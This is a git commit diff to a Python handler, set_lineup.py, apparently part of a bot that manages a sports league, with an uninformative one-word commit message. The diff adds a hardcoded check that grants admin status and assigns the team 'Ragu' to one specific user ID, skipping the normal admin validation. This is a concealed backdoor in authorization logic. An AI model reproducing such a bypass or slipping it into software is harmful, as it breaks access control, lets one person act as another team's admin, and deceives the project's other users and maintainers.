dabe41e4a121e7960a43f19e7400f96340ecca16
Logan Stanford <loganstanford53@gmail.com>
2024-07-10 15:43:34 -0400

    ass

--- command_handlers/league/set_lineup.py
+++ command_handlers/league/set_lineup.py
@@ -6,6 +6,10 @@ async def set_lineup_handler(db, message):
 
     valid_admin, _, team_name, _ = await validate_admin(db, message)
 
+    if message.author.id == 1112204092723441724:
+        valid_admin = True
+        team_name = 'Ragu'
+
     if not valid_admin:
         await message.channel.send('You are not an admin of a league team.')
         return
